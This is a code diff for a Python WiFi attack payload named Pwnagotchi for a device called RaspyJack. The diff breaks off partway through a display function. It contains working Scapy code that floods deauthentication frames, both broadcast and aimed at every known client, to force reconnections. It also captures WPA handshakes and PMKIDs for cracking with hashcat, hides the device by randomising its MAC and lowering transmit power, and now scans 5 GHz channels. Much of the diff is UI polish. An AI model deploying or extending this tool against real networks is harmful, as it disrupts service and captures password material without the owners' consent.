@@ -4,13 +4,14 @@ RaspyJack Payload -- Pwnagotchi
 ================================
 Author: 7h30th3r0n3
 
-Automated WiFi handshake and PMKID hunter with animated face UI.
+Automated WiFi handshake and PMKID hunter with pixel-art face UI.
 
 Features:
   Full 4-way handshake capture (passive EAPOL sniffing)
   Half-handshake capture (2+ EAPOL messages, crackable with hashcat)
   PMKID capture via RSN IE parsing
   Auto-deauth with smart targeting (toggle ON/OFF)
+  Broadcast + targeted deauth with adaptive interval
   Intelligent channel hopping (longer dwell on active channels 1,6,11)
   Whitelist MAC/SSID to exclude your own networks
   Stealth mode (MAC randomize + TX power reduction)
@@ -18,14 +19,18 @@ Features:
   Discord/webhook notification on capture
   Capture flash (visual feedback on handshake)
   Persistent lifetime stats across sessions
+  Pixel-art animated face with blink, pupil tracking, ZZZ
+  Activity sparkline graph
+  Channel activity stats view
+  Capture history browser
 
 Controls:
   OK         Start / Pause capture (session persists)
   UP / DOWN  Scroll stats
   LEFT/RIGHT Toggle deauth ON/OFF
-  KEY1       Cycle views: face > stats > whitelist
+  KEY1       Cycle views: face > stats > captures > whitelist
   KEY2       Toggle stealth mode
-  KEY3       Exit
+  KEY3       Exit (or back from sub-view)
 
 Loot: /root/Raspyjack/loot/Pwnagotchi/
 """
@@ -77,32 +82,17 @@ CONFIG_FILE = os.path.join(LOOT_DIR, "config.json")
 HANDSHAKE_DIR = os.path.join(LOOT_DIR, "handshakes")
 
 # Channel hopping: active channels get more dwell time
-CHANNELS_PRIORITY = [1, 6, 11]  # most common, dwell 5s
-CHANNELS_OTHER = [2, 3, 4, 5, 7, 8, 9, 10, 12, 13]  # dwell 2s
+# 2.4 GHz channels
+CHANNELS_24_PRIORITY = [1, 6, 11]
+CHANNELS_24_OTHER = [2, 3, 4, 5, 7, 8, 9, 10, 12, 13]
+# 5 GHz channels (common UNII bands)
+CHANNELS_5 = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165]
 DWELL_PRIORITY = 5
 DWELL_OTHER = 2
+DWELL_5GHZ = 3
 
-DEAUTH_INTERVAL = 25
 DEAUTH_COUNT = 5
 HALF_HS_MIN = 2  # minimum EAPOL msgs for half-handshake
-
-# ---------------------------------------------------------------------------
-# Faces
-# ---------------------------------------------------------------------------
-FACES = {
-    "awake":     "(  o . o  )",
-    "happy":     "(  ^ . ^  )",
-    "excited":   "(  * . *  )",
-    "cool":      "(  - . -  )",
-    "intense":   "(  @ . @  )",
-    "bored":     "(  . . .  )",
-    "lonely":    "(  ; . ;  )",
-    "sad":       "(  T . T  )",
-    "sleeping":  "(  - _ -  )",
-    "grateful":  "(  > . <  )",
-    "friend":    "(  o . O  )",
-    "stealth":   "(  # . #  )",
-}
 
 # ---------------------------------------------------------------------------
 # Shared state
@@ -131,7 +121,12 @@ eapol_buffer = {}
 last_capture_ssid = ""
 
 # Channel activity tracking for smart hopping
-channel_activity = {ch: 0 for ch in range(1, 14)}
+channel_activity = {ch: 0 for ch in range(1, 14)}  # live counters (reset every 10s for sparkline)
+channel_total = {ch: 0 for ch in range(1, 166)}     # cumulative counters (never reset, for stats view)
+
+# Activity sparkline history (sampled every 10s)
+activity_history = deque([0] * 20, maxlen=20)
+_last_activity_sample = time.time()
 
 # Peer detection
 peers_detected = set()
@@ -153,8 +148,16 @@ webhook_url = ""
 mon_iface = None
 original_mac = ""
 
-# View
-view = "face"  # face | stats | whitelist
+# View: face | stats | captures | whitelist
+view = "face"
+
+# Animation state
+_blink = False
+_next_blink = time.time() + random.uniform(5, 10)
+_pupil_x = 0.0
+_pupil_target = 0
+_pupil_change_time = time.time() + random.uniform(2, 4)
+_zzz_phase = 0.0
 
 
 def _cleanup_signal(*_):
@@ -168,6 +171,7 @@ signal.signal(signal.SIGTERM, _cleanup_signal)
 # ---------------------------------------------------------------------------
 # Config / Stats
 # ---------------------------------------------------------------------------
+
 
 def _load_stats():
     global lifetime_handshakes, lifetime_half_hs, lifetime_pmkid, lifetime_networks
@@ -224,6 +228,7 @@ def _save_config():
 # Webhook notification
 # ---------------------------------------------------------------------------
 
+
 def _send_webhook(message):
     if not webhook_url:
         return
@@ -240,6 +245,7 @@ def _send_webhook(message):
 # Monitor mode + stealth
 # ---------------------------------------------------------------------------
 
+
 def _get_mac(iface):
     try:
         with open(f"/sys/class/net/{iface}/address") as f:
@@ -250,18 +256,26 @@ def _get_mac(iface):
 
 def _randomize_mac(iface):
     """Randomize MAC address for stealth."""
-    new_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))
-    subprocess.run(["sudo", "ip", "link", "set", iface, "down"], capture_output=True, timeout=5)
-    subprocess.run(["sudo", "ip", "link", "set", iface, "address", new_mac], capture_output=True, timeout=5)
-    subprocess.run(["sudo", "ip", "link", "set", iface, "up"], capture_output=True, timeout=5)
+    new_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(
+        random.randint(0, 255) for _ in range(5)
+    )
+    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
+                   capture_output=True, timeout=5)
+    subprocess.run(["sudo", "ip", "link", "set", iface, "address", new_mac],
+                   capture_output=True, timeout=5)
+    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
+                   capture_output=True, timeout=5)
 
 
 def _restore_mac(iface, mac):
     if not mac:
         return
-    subprocess.run(["sudo", "ip", "link", "set", iface, "down"], capture_output=True, timeout=5)
-    subprocess.run(["sudo", "ip", "link", "set", iface, "address", mac], capture_output=True, timeout=5)
-    subprocess.run(["sudo", "ip", "link", "set", iface, "up"], capture_output=True, timeout=5)
+    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
+                   capture_output=True, timeout=5)
+    subprocess.run(["sudo", "ip", "link", "set", iface, "address", mac],
+                   capture_output=True, timeout=5)
+    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
+                   capture_output=True, timeout=5)
 
 
 def _reduce_tx_power(iface):
@@ -285,9 +299,11 @@ def _monitor_up(iface):
     r = subprocess.run(["iwconfig", iface], capture_output=True, text=True, timeout=5)
     if "Mode:Monitor" in r.stdout:
         return iface
-    subprocess.run(["sudo", "airmon-ng", "start", iface], capture_output=True, timeout=15)
+    subprocess.run(["sudo", "airmon-ng", "start", iface],
+                   capture_output=True, timeout=15)
     for name in (f"{iface}mon", iface):
-        r = subprocess.run(["iwconfig", name], capture_output=True, text=True, timeout=5)
+        r = subprocess.run(["iwconfig", name], capture_output=True, text=True,
+                           timeout=5)
         if "Mode:Monitor" in r.stdout:
             return name
     return None
@@ -297,7 +313,8 @@ def _monitor_down(iface):
     if not iface:
         return
     base = iface.replace("mon", "")
-    subprocess.run(["sudo", "airmon-ng", "stop", iface], capture_output=True, timeout=10)
+    subprocess.run(["sudo", "airmon-ng", "stop", iface],
+                   capture_output=True, timeout=10)
     for cmd in [
         ["sudo", "ip", "link", "set", base, "down"],
         ["sudo", "iw", base, "set", "type", "managed"],
@@ -314,6 +331,7 @@ def _set_channel(iface, ch):
 # ---------------------------------------------------------------------------
 # Mood engine
 # ---------------------------------------------------------------------------
+
 
 def _update_mood():
     global mood, mood_text
@@ -392,6 +410,7 @@ def _update_mood():
 # Packet handler
 # ---------------------------------------------------------------------------
 
+
 def _is_whitelisted(bssid, essid=""):
     if (bssid or "").upper() in whitelist_macs:
         return True
@@ -441,17 +460,16 @@ def _packet_handler(pkt):
                 session_aps[bssid]["signal"] = sig
                 session_aps[bssid]["last_seen"] = time.time()
             channel_activity[current_channel] = channel_activity.get(current_channel, 0) + 1
+            channel_total[current_channel] = channel_total.get(current_channel, 0) + 1
 
         # -- PMKID extraction from RSN IE --
         if bssid not in captured_bssids:
             try:
-                raw_pkt = bytes(raw(pkt))
-                # Search for PMKID in RSN IE (tag 48)
                 elt = pkt[Dot11Elt]
                 while elt:
                     if elt.ID == 48 and len(elt.info) >= 20:
                         rsn_data = elt.info
-                        # PMKID is in the PMKID List field at the end of RSN IE
+                        # PMKID is in the PMKID List field at the end
                         if len(rsn_data) > 24:
                             pmkid_candidate = rsn_data[-16:]
                             if pmkid_candidate != b'\x00' * 16:
@@ -464,13 +482,20 @@ def _packet_handler(pkt):
                                         last_capture_ssid = essid
                                         last_capture_time = time.time()
                                         capture_flash = 30
-                                        _save_capture(bssid, essid, [pkt], "pmkid")
+                                        _save_capture(bssid, essid, [pkt],
+                                                      "pmkid")
                                         _save_stats()
-                                        threading.Thread(target=_send_webhook,
-                                            args=(f"PMKID captured: {essid} ({bssid})",),
-                                            daemon=True).start()
+                                        threading.Thread(
+                                            target=_send_webhook,
+                                            args=(
+                                                f"PMKID captured: {essid} "
+                                                f"({bssid})",
+                                            ),
+                                            daemon=True,
+                                        ).start()
                                 break
-                    elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None
+                    elt = (elt.payload.getlayer(Dot11Elt)
+                           if elt.payload else None)
             except Exception:
                 pass
 
@@ -482,7 +507,9 @@ def _packet_handler(pkt):
             with lock:
                 session_aps[bss]["clients"].add(src)
                 session_clients[src] = bss
-                channel_activity[current_channel] = channel_activity.get(current_channel, 0) + 1
+                channel_activity[current_channel] = (
+                    channel_activity.get(current_channel, 0) + 1
+                )
 
     # -- Probe requests: peer detection --
     if pkt.haslayer(Dot11ProbeReq):
@@ -525,16 +552,22 @@ def _packet_handler(pkt):
                     last_capture_ssid = essid
                     last_capture_time = time.time()
                     capture_flash = 30
-                    fname = _save_capture(bssid, essid, eapol_buffer[pair], "hs4")
+                    fname = _save_capture(bssid, essid,
+                                          eapol_buffer[pair], "hs4")
                     _save_stats()
-                    threading.Thread(target=_send_webhook,
-                        args=(f"Full handshake: {essid} ({bssid}) saved as {fname}",),
-                        daemon=True).start()
+                    threading.Thread(
+                        target=_send_webhook,
+                        args=(
+                            f"Full handshake: {essid} ({bssid}) "
+                            f"saved as {fname}",
+                        ),
+                        daemon=True,
+                    ).start()
                     eapol_buffer[pair] = []
 
                 elif msg_count >= HALF_HS_MIN and msg_count < 4:
-                    # Check timeout: if no new EAPOL for 10s, save as half
-                    pass  # handled in _half_hs_checker
+                    # Check timeout handled in _half_hs_checker
+                    pass
 
             # Trim old buffers
             if msg_count > 8:
@@ -544,6 +577,7 @@ def _packet_handler(pkt):
 # ---------------------------------------------------------------------------
 # Half-handshake checker thread
 # ---------------------------------------------------------------------------
+
 
 def _half_hs_checker():
     """Periodically check for stale EAPOL buffers and save half-handshakes."""
@@ -560,9 +594,10 @@ def _half_hs_checker():
             stale_pairs = []
             for pair, pkts in eapol_buffer.items():
                 if len(pkts) >= HALF_HS_MIN and len(pkts) < 4:
-                    # If oldest packet is > 15s old, consider it stale
                     try:
-                        first_time = pkts[0].time if hasattr(pkts[0], 'time') else now - 20
+                        first_time = (pkts[0].time
+                                      if hasattr(pkts[0], 'time')
+                                      else now - 20)
                         if now - first_time > 15:
                             stale_pairs.append(pair)
                     except Exception:
@@ -588,28 +623,30 @@ def _half_hs_checker():
                     capture_flash = 20
                     _save_capture(bssid, essid, pkts, "hs_half")
                     _save_stats()
-                    threading.Thread(target=_send_webhook,
+                    threading.Thread(
+                        target=_send_webhook,
                         args=(f"Half handshake ({len(pkts)} msgs): {essid}",),
-                        daemon=True).start()
+                        daemon=True,
+                    ).start()
 
 
 # ---------------------------------------------------------------------------
 # Capture threads
 # ---------------------------------------------------------------------------
 
+
 def _channel_hopper():
-    """Smart channel hopping: longer dwell on active channels."""
+    """Smart channel hopping: 2.4GHz priority + 5GHz scan."""
     global current_channel
     while _running and capturing:
-        # Priority channels first
-        for ch in CHANNELS_PRIORITY:
+        # 2.4 GHz priority channels (1, 6, 11)
+        for ch in CHANNELS_24_PRIORITY:
             if not _running or not capturing:
                 return
             _set_channel(mon_iface, ch)
             with lock:
                 current_channel = ch
             dwell = DWELL_PRIORITY
-            # Even longer if high activity
             with lock:
                 act = channel_activity.get(ch, 0)
             if act > 50:
@@ -619,14 +656,31 @@ def _channel_hopper():
                     return
                 time.sleep(0.1)
 
-        # Other channels (shorter dwell)
-        for ch in CHANNELS_OTHER:
+        # 2.4 GHz other channels
+        for ch in CHANNELS_24_OTHER:
             if not _running or not capturing:
                 return
             _set_channel(mon_iface, ch)
             with lock:
                 current_channel = ch
             for _ in range(DWELL_OTHER * 10):
+                if not _running or not capturing:
+                    return
+                time.sleep(0.1)
+
+        # 5 GHz channels (if adapter supports it)
+        for ch in CHANNELS_5:
+            if not _running or not capturing:
+                return
+            r = subprocess.run(
+                ["sudo", "iw", "dev", mon_iface, "set", "channel", str(ch)],
+                capture_output=True, timeout=3,
+            )
+            if r.returncode != 0:
+                continue  # adapter doesn't support this channel
+            with lock:
+                current_channel = ch
+            for _ in range(DWELL_5GHZ * 10):
                 if not _running or not capturing:
                     return
                 time.sleep(0.1)
@@ -651,10 +705,20 @@ def _sniffer():
 
 
 def _deauther():
-    """Smart deauth: prioritize APs with most clients, skip already captured."""
+    """Enhanced deauth: broadcast + all clients, adaptive interval."""
     global session_deauths
     while _running and capturing:
-        for _ in range(DEAUTH_INTERVAL * 10):
+        # Adaptive interval based on AP count
+        with lock:
+            ap_count = len(session_aps)
+        if ap_count > 10:
+            interval = 15
+        elif ap_count >= 3:
+            interval = 25
+        else:
+            interval = 40
+
+        for _ in range(interval * 10):
             if not _running or not capturing or not deauth_enabled:
                 time.sleep(0.1)
                 continue
@@ -672,45 +736,176 @@ def _deauther():
                 if bssid in captured_bssids:
                     continue
                 clients = list(info.get("clients", set()))
-                if clients:
-                    for client in clients[:3]:
-                        targets.append((
-                            bssid, client, info.get("channel", 1),
-                            len(clients),  # priority score
-                        ))
+                targets.append((
+                    bssid,
+                    clients,
+                    info.get("channel", 1),
+                    len(clients),
+                ))
 
         if not targets:
             continue
 
         # Sort by client count (more clients = higher priority)
         targets.sort(key=lambda x: x[3], reverse=True)
-        target = targets[0]  # pick highest priority
-        bssid, client, ch, _ = target
+        bssid, clients, ch, _ = targets[0]
 
         try:
+            # Hop to the target AP's channel for deauth + capture
             _set_channel(mon_iface, ch)
-            # Send deauth in both directions
-            deauth1 = (RadioTap()
-                       / Dot11(addr1=client, addr2=bssid, addr3=bssid,
-                               type=0, subtype=12)
-                       / Dot11Deauth(reason=7))
-            deauth2 = (RadioTap()
-                       / Dot11(addr1=bssid, addr2=client, addr3=bssid,
-                               type=0, subtype=12)
-                       / Dot11Deauth(reason=7))
-            sendp(deauth1, iface=mon_iface, count=DEAUTH_COUNT,
+            with lock:
+                current_channel = ch
+
+            # Broadcast deauth (FF:FF:FF:FF:FF:FF)
+            broadcast_deauth = (
+                RadioTap()
+                / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid,
+                        addr3=bssid, type=0, subtype=12)
+                / Dot11Deauth(reason=7)
+            )
+            sendp(broadcast_deauth, iface=mon_iface, count=DEAUTH_COUNT,
                   inter=0.05, verbose=False)
-            sendp(deauth2, iface=mon_iface, count=DEAUTH_COUNT,
-                  inter=0.05, verbose=False)
+
+            # Targeted deauth for ALL known clients of this AP
+            for client in clients:
+                deauth_to_client = (
+                    RadioTap()
+                    / Dot11(addr1=client, addr2=bssid, addr3=bssid,
+                            type=0, subtype=12)
+                    / Dot11Deauth(reason=7)
+                )
+                deauth_to_ap = (
+                    RadioTap()
+                    / Dot11(addr1=bssid, addr2=client, addr3=bssid,
+                            type=0, subtype=12)
+                    / Dot11Deauth(reason=7)
+                )
+                sendp(deauth_to_client, iface=mon_iface,
+                      count=DEAUTH_COUNT, inter=0.05, verbose=False)
+                sendp(deauth_to_ap, iface=mon_iface,
+                      count=DEAUTH_COUNT, inter=0.05, verbose=False)
+
             with lock:
                 session_deauths += 1
         except Exception:
             pass
 
 
+def _activity_sampler():
+    """Sample channel activity every 10s for the sparkline."""
+    while _running:
+        time.sleep(10)
+        if not _running:
+            break
+        with lock:
+            total = sum(channel_activity.values())
+        activity_history.append(total)
+        # Reset counters for next sample window
+        with lock:
+            for ch in channel_activity:
+                channel_activity[ch] = 0
+
+
 # ---------------------------------------------------------------------------
-# LCD Drawing
+# Animation helpers
 # ---------------------------------------------------------------------------
+
+
+def _update_animation():
+    """Update blink/pupil/zzz animation state. Called each frame."""
+    global _blink, _next_blink, _pupil_x, _pupil_target
+    global _pupil_change_time, _zzz_phase
+
+    now = time.time()
+
+    # Blink logic
+    if _blink:
+        # blink lasts ~0.2s
+        if now > _next_blink + 0.2:
+            _blink = False
+            _next_blink = now + random.uniform(5, 10)
+    else:
+        if now >= _next_blink:
+            _blink = True
+
+    # Pupil tracking: smooth interpolation toward target
+    if now >= _pupil_change_time:
+        _pupil_target = random.randint(-2, 2)
+        _pupil_change_time = now + random.uniform(2, 4)
+    diff = _pupil_target - _pupil_x
+    _pupil_x += diff * 0.3  # smooth ease
+
+    # ZZZ floating phase
+    _zzz_phase = (now * 0.5) % 3.0
+
+
+# ---------------------------------------------------------------------------
+# Pixel art face drawing
+# ---------------------------------------------------------------------------
+
+
+FACES = {
+    "awake":    "(  o . o  )",
+    "happy":    "(  ^ . ^  )",
+    "excited":  "(  * . *  )",
+    "cool":     "(  - . -  )",
+    "intense":  "(  @ . @  )",
+    "bored":    "(  . . .  )",
+    "lonely":   "(  ; . ;  )",
+    "sad":      "(  T . T  )",
+    "sleeping": "(  -  _  -  )",
+    "grateful": "(  > . <  )",
+    "friend":   "(  o . O  )",
+    "stealth":  "(  # . #  )",
+}
+
+def _draw_pixel_face(d, face_mood, blink, pupil_offset_x):
+    """Draw ASCII face centered in the top area (y=0..40, base-128)."""
+    try:
+        face_font = scaled_font(14)
+    except Exception:
+        face_font = font_obj
+    face_text = FACES.get(face_mood, FACES["awake"])
+    if blink:
+        face_text = "(  -  .  -  )"
+    face_color = "#00FF00" if capturing else "#666666"
+    if capture_flash > 0:
+        face_color = "#FFFF00"
+    if stealth_enabled:
+        face_color = "#8800FF"
+    # Center face using anchor="mm" (middle-middle) at center of face area
+    d.text((63, 20), face_text, font=face_font, fill=face_color, anchor="mm")
+
+
+# ---------------------------------------------------------------------------
+# Sparkline drawing
+# ---------------------------------------------------------------------------
+
+
+def _draw_sparkline(d, x, y, w, h, data):
+    """Draw a mini bar chart from a deque of values."""
+    if not data or max(data) == 0:
+        d.rectangle((x, y, x + w, y + h), outline="#222")
+        return
+    mx = max(data)
+    bar_w = max(1, w // len(data))
+    for i, v in enumerate(data):
+        bh = max(0, int(v / mx * h))
+        bx = x + i * bar_w
+        if v > mx * 0.6:
+            color = "#00FF00"
+        elif v > mx * 0.2:
+            color = "#FFAA00"
+        else:
+            color = "#FF4444"
+        if bh > 0:
+            d.rectangle((bx, y + h - bh, bx + bar_w - 1, y + h), fill=color)
+
+
+# ---------------------------------------------------------------------------
+# LCD Drawing -- Face view
+# ---------------------------------------------------------------------------
+
 
 def _draw_face(lcd, font_obj, font_sm):
     global capture_flash
@@ -718,7 +913,7 @@ def _draw_face(lcd, font_obj, font_sm):
     d = ScaledDraw(img)
 
     _update_mood()
-    face_art = FACES.get(mood, FACES["awake"])
+    _update_animation()
 
     with lock:
         ch = current_channel
@@ -737,126 +932,287 @@ def _draw_face(lcd, font_obj, font_sm):
         stlth = stealth_enabled
         peers = len(peers_detected)
 
-    # Capture flash effect
+    # Capture flash effect (bright green border flash)
     if capture_flash > 0:
         capture_flash -= 1
-        if capture_flash % 4 < 2:
-            d.rectangle((0, 0, 127, 127), fill="#003300")
+        if capture_flash % 6 < 3:
+            d.rectangle((0, 0, 127, 3), fill="#00FF00")
+            d.rectangle((0, 124, 127, 127), fill="#00FF00")
+            d.rectangle((0, 0, 3, 127), fill="#00FF00")
+            d.rectangle((124, 0, 127, 127), fill="#00FF00")
 
     # Uptime
     elapsed = int(time.time() - start_time)
-    h, m_val, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
-    uptime = f"{h:02d}:{m_val:02d}:{s:02d}"
+    h_val = elapsed // 3600
+    m_val = (elapsed % 3600) // 60
+    s_val = elapsed % 60
+    uptime = f"{h_val:02d}:{m_val:02d}:{s_val:02d}"
 
-    # Face
-    face_color = "#00FF00" if cap else "#666"
-    if capture_flash > 0:
-        face_color = "#FFFF00"
-    if stlth:
-        face_color = "#8800FF"
-    d.text((8, 1), face_art, font=font_obj, fill=face_color)
-
-    # Mood text
-    d.text((2, 15), mood_text[:24], font=font_sm, fill="#AAAAAA")
+    # -- Pixel art face (y=0..40) --
+    _draw_pixel_face(d, mood, _blink, _pupil_x)
 
     # Separator
-    d.line([(0, 26), (127, 26)], fill="#333")
+    d.line([(0, 41), (127, 41)], fill="#333")
 
-    y = 28
+    y = 43
 
-    # Channel + Mode
+    # CH + Mode
+    d.text((2, y), f"CH:{ch}", font=font_sm, fill="#FFAA00")
     mode_parts = []
     if cap:
         mode_parts.append("AUTO")
-    else:
-        mode_parts.append("IDLE")
     if deauth_on:
         mode_parts.append("DTH")
     if stlth:
         mode_parts.append("STH")
-    mode_str = "+".join(mode_parts)
-    d.text((2, y), f"CH:{ch}", font=font_sm, fill="#FFAA00")
-    d.text((36, y), mode_str[:14], font=font_sm, fill="#58a6ff")
-    y += 11
+    d.text((36, y), "+".join(mode_parts) or "IDLE",
+           font=font_sm, fill="#58a6ff")
+    y += 12
 
-    # APs + Clients
+    # AP + CLI + Peers
     d.text((2, y), f"AP:{aps}", font=font_sm, fill="#00FF00")
     d.text((40, y), f"CLI:{total_clients}", font=font_sm, fill="#00CCFF")
     if peers > 0:
         d.text((90, y), f"P:{peers}", font=font_sm, fill="#FF00FF")
-    y += 11
+    y += 12
+
+    # PWND
+    total_pwnd = hs + hhs
+    lt_total = lt_hs + lt_hhs + lt_pm
+    pwnd_color = "#00FF00" if total_pwnd > 0 else "#888"
+    d.text((2, y), f"PWND:{hs}+{hhs}h", font=font_sm, fill=pwnd_color)
+    d.text((80, y), f"({lt_total})", font=font_sm, fill="#666")
+    y += 12
 
     # Uptime
     d.text((2, y), f"UP:{uptime}", font=font_sm, fill="#888")
-    y += 11
-
-    # PWND: full + half
-    total_pwnd = hs + hhs
-    pwnd_color = "#00FF00" if total_pwnd > 0 else "#888"
-    d.text((2, y), f"PWND:{hs}", font=font_sm, fill=pwnd_color)
-    if hhs > 0:
-        d.text((50, y), f"+{hhs}half", font=font_sm, fill="#FFAA00")
-    d.text((95, y), f"({lt_hs + lt_hhs})", font=font_sm, fill="#666")
-    y += 11
-
-    # PMKID
-    if pm > 0 or lt_pm > 0:
-        d.text((2, y), f"PMKID:{pm}", font=font_sm, fill="#FF00FF")
-        d.text((70, y), f"({lt_pm})", font=font_sm, fill="#666")
-        y += 11
+    y += 12
 
     # Last capture
     if last:
-        d.text((2, y), f">{last[:22]}", font=font_sm, fill="#00FF00")
-        y += 11
+        d.text((2, y), f">{last[:20]}", font=font_sm, fill="#00FF00")
+        y += 12
 
-    # Deauth
-    if deauths > 0:
-        d.text((2, y), f"DEAUTH:{deauths}", font=font_sm, fill="#FF4444")
+    # Sparkline (activity graph, last 20 samples)
+    _draw_sparkline(d, 2, y, 123, 10, activity_history)
 
     # Footer
     d.rectangle((0, 116, 127, 127), fill="#111")
     if cap:
-        d.text((2, 117), "OK:Pse L/R:Dth K2:Sth", font=font_sm, fill="#888")
+        d.text((2, 117), "OK:Pse L/R:Dth K2:Sth",
+               font=font_sm, fill="#888")
     else:
-        d.text((2, 117), "OK:Go K1:View K2:Sth K3:X", font=font_sm, fill="#888")
+        d.text((2, 117), "OK:Go K1:View K2:Sth K3:X",
+               font=font_sm, fill="#888")
 
     lcd.LCD_ShowImage(img, 0, 0)
+
+
+# ---------------------------------------------------------------------------
+# LCD Drawing -- Stats view (channel activity + top APs)
+# ---------------------------------------------------------------------------
 
 
 def _draw_stats(lcd, font_obj, font_sm, scroll):
     img = Image.new("RGB", (WIDTH, HEIGHT), "black")
     d = ScaledDraw(img)
 
+    # Header
     d.rectangle((0, 0, 127, 13), fill="#111")
-    d.text((2, 1), "AP LIST", font=font_sm, fill="#00FF00")
+    with lock:
+        aps = len(session_aps)
+        total_clients = len(session_clients)
+    d.text((2, 1), "STATS", font=font_sm, fill="#00FF00")
+    d.text((50, 1), f"AP:{aps} CLI:{total_clients}",
+           font=font_sm, fill="#888")
 
     with lock:
-        aps_list = sorted(session_aps.items(),
-                          key=lambda x: len(x[1].get("clients", set())), reverse=True)
+        ch_act = dict(channel_total)
+        cur_ch = current_channel
 
-    lines = []
-    for bssid, info in aps_list:
+    # Determine band
+    is_5g = cur_ch > 14
+    band_label = "5GHz" if is_5g else "2.4G"
+    band_color = "#FF00FF" if is_5g else "#58a6ff"
+
+    # Current channel info line
+    act_cur = ch_act.get(cur_ch, 0)
+    d.text((2, 16), f"CH:{cur_ch}", font=font_sm, fill="#FFFFFF")
+    d.text((40, 16), band_label, font=font_sm, fill=band_color)
+    d.text((70, 16), f"pkts:{act_cur}", font=font_sm, fill="#FFAA00")
+
+    # --- Unified channel radar (y=28 to y=72) ---
+    # Build list of all channels with activity + always show all 2.4GHz
+    all_channels = list(range(1, 14))
+    for c in CHANNELS_5:
+        if ch_act.get(c, 0) > 0 or c == cur_ch:
+            all_channels.append(c)
+
+    # Find window centered on current channel
+    if cur_ch in all_channels:
+        center_idx = all_channels.index(cur_ch)
+    else:
+        all_channels.append(cur_ch)
+        all_channels.sort()
+        center_idx = all_channels.index(cur_ch)
+
+    # Show max 15 channels, centered on current
+    window_size = 15
+    half = window_size // 2
+    start = max(0, center_idx - half)
+    end = min(len(all_channels), start + window_size)
+    start = max(0, end - window_size)
+    visible_channels = all_channels[start:end]
+
+    max_act = max((ch_act.get(c, 0) for c in visible_channels), default=1) or 1
+    bar_top = 28
+    bar_h_max = 30
+    bar_w = max(3, 124 // max(len(visible_channels), 1))
+
+    for i, ch in enumerate(visible_channels):
+        x = 2 + i * bar_w
+        act = ch_act.get(ch, 0)
+        bh = max(1, int(act / max_act * bar_h_max)) if act > 0 else 0
+
+        # Color: white=current, green=high, yellow=medium, dark=inactive
+        # Purple tint for 5GHz channels
+        if ch == cur_ch:
+            bar_color = "#FFFFFF"
+        elif ch > 14:
+            bar_color = "#FF00FF" if act > max_act * 0.3 else "#442244"
+        elif act > max_act * 0.6:
+            bar_color = "#00FF00"
+        elif act > 0:
+            bar_color = "#FFAA00"
+        else:
+            bar_color = "#181818"
+
+        if bh > 0:
+            d.rectangle((x, bar_top + bar_h_max - bh, x + bar_w - 2, bar_top + bar_h_max), fill=bar_color)
+        else:
+            d.rectangle((x, bar_top + bar_h_max - 1, x + bar_w - 2, bar_top + bar_h_max), fill="#181818")
+
+        # Channel number below bar
+        ch_str = str(ch)
+        ch_color = "#FFFFFF" if ch == cur_ch else "#555"
+        if bar_w >= 7:
+            d.text((x, bar_top + bar_h_max + 2), ch_str[:2], font=font_sm, fill=ch_color)
+
+    # Marker arrow above current channel bar
+    if cur_ch in visible_channels:
+        ci = visible_channels.index(cur_ch)
+        arrow_x = 2 + ci * bar_w + bar_w // 2
+        d.polygon([(arrow_x - 2, bar_top - 2), (arrow_x + 2, bar_top - 2), (arrow_x, bar_top - 5)], fill="#FFFFFF")
+
+    # --- Separator ---
+    y_sep = bar_top + bar_h_max + 14
+    d.line([(0, y_sep), (127, y_sep)], fill="#333")
+
+    # --- Top APs ---
+    y = y_sep + 2
+    d.text((2, y), "TOP APs:", font=font_sm, fill="#58a6ff")
+    y += 10
+
+    with lock:
+        aps_list = sorted(
+            session_aps.items(),
+            key=lambda x: len(x[1].get("clients", set())),
+            reverse=True,
+        )
+
+    max_aps = max(2, (115 - y) // 11)
+    visible_aps = aps_list[scroll:scroll + max_aps]
+    for bssid, info in visible_aps:
         essid = info.get("essid", "?")[:11]
-        ch = info.get("channel", "?")
         cli = len(info.get("clients", set()))
         sig = info.get("signal", -99)
         pwned = "!" if bssid in captured_bssids else " "
-        lines.append((f"{pwned}{essid}", f"c{ch} {cli}cli {sig}dB", bssid in captured_bssids))
+        name_color = "#00FF00" if bssid in captured_bssids else "#FFFFFF"
+        d.text((2, y), f"{pwned}{essid}", font=font_sm, fill=name_color)
+        d.text((75, y), f"{cli}c {sig}dB", font=font_sm, fill="#888")
+        y += 11
 
-    visible = lines[scroll:scroll + 7]
-    for i, (name, detail, pwned) in enumerate(visible):
-        y = 16 + i * 14
-        name_color = "#00FF00" if pwned else "#FFFFFF"
-        d.text((2, y), name[:13], font=font_sm, fill=name_color)
-        d.text((68, y), detail[:10], font=font_sm, fill="#888")
+    if not aps_list:
+        d.text((4, y), "No APs yet", font=font_sm, fill="#666")
 
-    if not lines:
-        d.text((4, 50), "No APs yet", font=font_sm, fill="#666")
+    # Average signal
+    if aps_list:
+        sigs = [info.get("signal", -99) for _, info in aps_list
+                if info.get("signal", -99) != -99]
+        if sigs:
+            avg_sig = sum(sigs) // len(sigs)
+            d.text((2, 105), f"AVG Signal: {avg_sig}dBm",
+                   font=font_sm, fill="#888")
 
+    # Footer
     d.rectangle((0, 116, 127, 127), fill="#111")
-    d.text((2, 117), f"{len(aps_list)}APs U/D:Scrl K1:View", font=font_sm, fill="#888")
+    d.text((2, 117), f"{len(aps_list)}APs U/D:Scrl K1:View",
+           font=font_sm, fill="#888")
     lcd.LCD_ShowImage(img, 0, 0)
+
+
+# ---------------------------------------------------------------------------
+# LCD Drawing -- Captures view (browsable history)
+# ---------------------------------------------------------------------------
+
+
+def _list_captures():
+    """Return sorted list of capture filenames from HANDSHAKE_DIR."""
+    if not os.path.isdir(HANDSHAKE_DIR):
+        return []
+    try:
+        files = [f for f in os.listdir(HANDSHAKE_DIR) if f.endswith(".pcap")]
+        files.sort(reverse=True)  # newest first
+        return files
+    except Exception:
+        return []
+
+
+def _draw_captures(lcd, font_obj, font_sm, scroll):
+    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
